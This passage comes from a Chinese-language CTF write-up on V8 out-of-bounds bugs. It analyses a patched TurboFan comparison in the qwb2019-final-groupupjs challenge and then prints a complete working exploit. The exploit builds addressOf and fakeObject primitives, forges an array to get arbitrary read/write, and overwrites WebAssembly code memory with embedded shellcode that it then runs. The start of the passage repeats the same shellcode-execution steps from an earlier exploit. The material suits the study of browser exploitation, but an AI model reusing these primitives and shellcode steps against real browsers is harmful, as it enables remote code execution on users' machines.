var wasm_shellcode_addr_l = adv.getUint32(0,true);
var wasm_shellcode_addr_h = adv.getUint32(4,true);
print('wasm_shellcode_addr=' + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
oob_double_arr[0x12] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//执行shellcode
func();
```



## 0x04 JIT中的OOB

### <a class="reference-link" name="0x04.00%20qwb2019-final-groupupjs"></a>0x04.00 qwb2019-final-groupupjs

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc
index a6a8e87cf4..164ab44fab 100644
--- a/src/compiler/machine-operator-reducer.cc
+++ b/src/compiler/machine-operator-reducer.cc
@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) `{`
       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false
       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false
       if (m.IsFoldable()) `{`                                    // K &lt; K =&gt; K
-        return ReplaceBool(m.left().Value() &lt; m.right().Value());
+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);
       `}`
       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false
       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) `{`
```

该patch打在`MachineOperatorReducer::Reduce`函数中，可以推测这个漏洞与JIT编译器有关。<br>
JIT中的IR优化流程如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f85776de52c12000.png)

其中MachineOperatorReducer发生在Reduce阶段也就是图中`SimplifiedLoweringPhase`阶段，`MachineOperatorReducer::Reduce`会将IR中间代码中的一些可以在编译时就计算出的条件直接优化为一个布尔值。<br>
而我们的patch正好打在了`IrOpcode::kInt32LessThan`分支，也就是如果IR代码中有`kInt32LessThan`的代码调用，将会出现问题，可以溢出一个单位。<br>
而数组的length则是Int32类型，尝试写出如下的测试代码

```
function opt(x) `{`
   var a = [1.1,2.2,3.3,4.4];
   return a[4];
`}`

for (var i=0;i&lt;0x20000;i++) `{`
   opt(i);
`}`

print(opt(i));
```

发现并没有发生溢出，为了追踪优化过程，我们v8自带的`Turbolizer`来查看v8生成的IR图，执行

```
./d8 1.js --trace-turbo --trace-turbo-path ../
```

生成IR图，然后用`Turbolizer`打开查看

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0171b06a0cc24db44d.png)

发现其在`LoadElimination Phase`阶段，直接使用`CheckBounds`来进行检查了，也就是还未到达`SimplifiedLoweringPhase`阶段时，JIT就已经知道这个为越界的访问。因此，我们可以将4包裹在一个字典对象里，这样在`LoadElimination Phase`阶段，JIT就不知道越界了，因为后面还要进行`Escape Analyse`才能知道值。<br>
于是代码修改为这样

```
function opt(x) `{`
   var a = [1.1,2.2,3.3,4.4];
   var e = `{`a:4`}`
   return a[e.a];
`}`

for (var i=0;i&lt;0x20000;i++) `{`
   opt(i);
`}`

print(opt(i));
```

可以发现输出了一个double值

```
root@ubuntu:~/Desktop/qwb2019-final-groupupjs/x64.debug# ./d8 1.js --trace-turbo --trace-turbo-path ../
Concurrent recompilation has been disabled for tracing.
---------------------------------------------------
Begin compiling method opt using TurboFan
---------------------------------------------------
Finished compiling method opt using TurboFan
---------------------------------------------------
Begin compiling method  using TurboFan
---------------------------------------------------
Finished compiling method  using TurboFan
-1.1885946300594787e+148
```

这回由于信息不足，不能在`LoadElimination Phase`阶段确定，因此仅检查了最大范围

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01192cf4d59c3c83d0.png)

然后在`SimplifiedLoweringPhase`阶段，用了`Uint32LessThan`，由于`Uint32LessThan`被patch过，因此结果为True，那么就可以越界访问了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0138511d34d43f8f2a.png)

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

构造出一个oob数组后，改写数组对象的MAP，然后构造`addressOf`和`fakeObject`原语。<br>
exp

```
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64f(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getBigUint64(0,true);
`}`


var arr;
var obj_arr;
function opt()`{`
   arr = [1.1,2.2,3.3,4.4];
   obj_arr = [arr];
   var e = `{`a:arr.length`}`;
   return arr[e.a];
`}`


for(var i=0; i &lt; 0x20000; i++)`{`
    opt();
`}`

var double_element_map = opt();

//print(u64f(double_element_map).toString(16));
var obj_element_map = i2f64(u64f(double_element_map) + 0xa0n);
print((u64f(double_element_map)).toString(16));

function fakeObject_opt(addr) `{`
   arr = [addr,2.2,3.3,4.4];
   var e = `{`a:arr.length`}`;
   arr[e.a] = obj_element_map;
   return arr;
`}`

//JIT优化
for (var i=0;i&lt;0x20000;i++) `{`
   fakeObject_opt(double_element_map);
`}`

function fakeObject(addr) `{`
   return fakeObject_opt(i2f64(addr + 0x1n))[0];
`}`

//获得MAP对象
var double_element_map_obj = fakeObject_opt(double_element_map)[0];

//print(double_element_map_obj);

function addressOf_opt(obj) `{`
   var arr = [obj,obj,obj,obj];
   var e = `{`a:arr.length`}`;
   arr[e.a] = double_element_map_obj;
   return arr;
`}`

//JIT优化
for (var i=0;i&lt;0x20000;i++) `{`
   addressOf_opt(buf);
`}`

function addressOf(obj) `{`
   var v = addressOf_opt(obj)[0];
   return u64f(v) - 0x1n;
`}`

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
var arb_buf = new ArrayBuffer(0x10);
var faker_addr = addressOf(faker);
print('faker_addr='+faker_addr.toString(16));
wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;
var element_addr = faker_addr - 0x60n;
print('element_addr=' + element_addr.toString(16));
//fake a FixedDoubleArray
faker[0] = double_element_map;
faker[1] = i2f64(0n);
faker[2] = i2f64(element_addr+0x1n);
faker[3] = i2f64(0x300000000000n);

var oob_arr = fakeObject(element_addr + 0x10n);
oob_arr[0x11] = i2f64(0x1000n); //修改ArrayBuffer的length
oob_arr[0x12] = i2f64(wasm_shellcode_ptr_addr);


var adv = new DataView(arb_buf);
var wasm_shellcode_addr = adv.getBigUint64(0,true);
print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));

oob_arr[0x12] = i2f64(wasm_shellcode_addr);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//%SystemBreak();
//执行shellcode
func();
```



## 0x05 感想

oob类型的v8漏洞，其利用手法大多相似，不同点在于如何构造出oob数组。从一开始的直入主题到一般情况再到回调函数中的oob以及JIT中的oob，收获了许多知识。
